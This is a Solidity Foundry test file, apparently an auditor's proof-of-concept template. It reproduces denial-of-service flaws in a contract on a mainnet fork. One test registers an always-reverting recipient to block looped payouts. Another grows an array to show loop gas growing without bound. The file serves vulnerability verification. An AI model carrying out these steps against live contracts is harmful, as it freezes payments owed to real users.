// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Denial of service (revert-in-loop + unbounded loop)
/// @notice (a) Revert-in-loop: the target pays recipients in a LOOP
///         (push payments). ONE recipient that reverts bricks the WHOLE
///         distribution -- nobody gets paid.
///         (b) Unbounded loop: the target iterates an array anyone can
///             grow. Gas grows with the array until the function exceeds
///             the block gas limit and can NEVER run again.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: adapt distribute() / addRecipient()
///      / push() / process() to the target's real functions.

contract Reverter {
    receive() external payable {
        revert("recipient always reverts");
    }
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    /// One distribution attempt. Returns whether it completed.
    function _distributeOnce(string memory label, bytes memory data) internal returns (bool) {
        (bool ok,) = target.call(data);
        console.log("tried", label, ok ? "call returned" : "call reverted");
        return ok;
    }

    function test_revertInLoopBricksDistribution() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);
        Reverter reverter = new Reverter();

        // CONTROL FIRST. For a DoS the reproduction is that a call FAILS, and a
        // wrong selector also fails — so "the call reverted" alone proves
        // nothing. The control is what separates the two: the SAME selector must
        // work before the reverting recipient is registered and stop working
        // after.
        bytes memory chosen;
        bytes memory d;
        d = abi.encodeWithSignature("distribute()");
        if (_distributeOnce("distribute()", d)) chosen = d;
        if (chosen.length == 0) {
            d = abi.encodeWithSignature("distributeAll()");
            if (_distributeOnce("distributeAll()", d)) chosen = d;
        }
        if (chosen.length == 0) {
            d = abi.encodeWithSignature("payout()");
            if (_distributeOnce("payout()", d)) chosen = d;
        }
        if (chosen.length == 0) {
            d = abi.encodeWithSignature("payOut()");
            if (_distributeOnce("payOut()", d)) chosen = d;
        }
        if (chosen.length == 0) {
            d = abi.encodeWithSignature("run()");
            if (_distributeOnce("run()", d)) chosen = d;
        }
        require(
            chosen.length > 0,
            "no distribution entry point completed BEFORE the injection, so a later revert would prove nothing. Tried distribute(), distributeAll(), payout(), payOut(), run(). This does NOT establish safety."
        );

        // Register a recipient that reverts on receipt.
        bool injected;
        if (!injected) { vm.prank(attackerEOA); (injected,) = target.call(abi.encodeWithSignature("addRecipient(address)", address(reverter))); console.log("tried addRecipient(address)", injected ? "call returned" : "call reverted"); }
        if (!injected) { vm.prank(attackerEOA); (injected,) = target.call(abi.encodeWithSignature("addPayee(address)", address(reverter))); console.log("tried addPayee(address)", injected ? "call returned" : "call reverted"); }
        if (!injected) { vm.prank(attackerEOA); (injected,) = target.call(abi.encodeWithSignature("add(address)", address(reverter))); console.log("tried add(address)", injected ? "call returned" : "call reverted"); }
        if (!injected) { vm.prank(attackerEOA); (injected,) = target.call(abi.encodeWithSignature("setRecipient(address)", address(reverter))); console.log("tried setRecipient(address)", injected ? "call returned" : "call reverted"); }
        if (!injected) { vm.prank(attackerEOA); (injected,) = target.call(abi.encodeWithSignature("push(address)", address(reverter))); console.log("tried push(address)", injected ? "call returned" : "call reverted"); }
        require(
            injected,
            "no recipient-adding entry point accepted the reverting recipient. Tried addRecipient(address), addPayee(address), add(address), setRecipient(address), push(address). This does NOT establish safety."
        );

        // The SAME selector that worked in the control.
        (bool okAfter,) = target.call(chosen);
        console.log("distribution after the reverting recipient:", okAfter ? "still works" : "now reverts");
        assertTrue(
            !okAfter,
            "the distribution still completed with a reverting recipient registered. This does NOT establish safety: the recipient may not have been registered, or the loop may skip failing recipients."
        );
    }

    /// One array-growth attempt (a setup precondition: it must simply work).
    function _growOnce(string memory label, bytes memory data) internal returns (bool) {
        (bool ok,) = target.call(data);
        return ok;
    }

    function test_unboundedLoopGasGrowth() public {
        // The growth and processing functions are GUESSES on an unverified
        // target; one wrong name reports "not reproduced" for a vulnerability
        // that exists under another. Success is the GAS GROWING with the array,
        // not either call returning.
        bool grew;
        for (uint256 i = 0; i < 25 && !grew; i++) {
            grew = _growOnce("push(uint256)", abi.encodeWithSignature("push(uint256)", i));
        }
        if (!grew) { for (uint256 i = 0; i < 25 && !grew; i++) grew = _growOnce("add(uint256)", abi.encodeWithSignature("add(uint256)", i)); }
        if (!grew) { for (uint256 i = 0; i < 25 && !grew; i++) grew = _growOnce("append(uint256)", abi.encodeWithSignature("append(uint256)", i)); }
        require(
            grew,
            "no array-growth entry point accepted an item. Tried push(uint256), add(uint256), append(uint256). This does NOT establish safety."
        );

        bytes memory p = abi.encodeWithSignature("process()");
        uint256 gasBefore = gasleft();
        (bool ok1,) = target.call(p);
        uint256 gas1 = gasBefore - gasleft();
        if (!ok1) {
            p = abi.encodeWithSignature("run()");
            gasBefore = gasleft();
            (ok1,) = target.call(p);
            gas1 = gasBefore - gasleft();
        }
        require(ok1, "no processing entry point completed at 25 entries. Tried process(), run(). This does NOT establish safety.");

        for (uint256 i = 25; i < 50; i++) {
            (bool g,) = target.call(abi.encodeWithSignature("push(uint256)", i));
            if (!g) { (g,) = target.call(abi.encodeWithSignature("add(uint256)", i)); }
        }
        gasBefore = gasleft();
        (bool ok2,) = target.call(p);
        uint256 gas2 = gasBefore - gasleft();
        require(ok2, "the processing entry point that worked at 25 entries failed at 50");

        console.log("process gas at 25 entries:", gas1);
        console.log("process gas at 50 entries:", gas2);
        assertGt(
            gas2,
            gas1,
            "processing gas does not grow with the array. This does NOT establish safety: the growth function may not be the one used, or the loop may be bounded."
        );
    }
}
